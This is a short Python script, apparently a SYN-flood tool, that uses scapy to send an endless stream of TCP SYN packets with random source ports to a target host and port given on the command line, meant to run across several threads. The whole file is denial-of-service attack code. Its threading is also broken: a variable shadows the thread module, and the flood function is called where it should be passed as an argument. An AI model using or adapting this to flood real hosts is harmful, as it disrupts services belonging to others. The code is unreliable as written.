import sys
from scapy.all import *
from time import sleep
import thread
import logging
import random

from scapy.layers.inet import TCP, IP

if len(sys.argv) != 4:
    print("Using ./SYNFlooding [target] [port] [Threads]")
    sys.exit(1)

target = str(sys.argv[1])
port = int(sys.argv[2])
thread = int(sys.argv[3])

print("SYNFlooding en cours...")
def synFlood(target, port):
    while 1:
        x = random.randint(0, 65535)
        send(IP(dst=target)/TCP(dport=port, sport=x), verbose=0)
for x in range(0, thread):
    thread.start_new_thread(synFlood((target, port)))
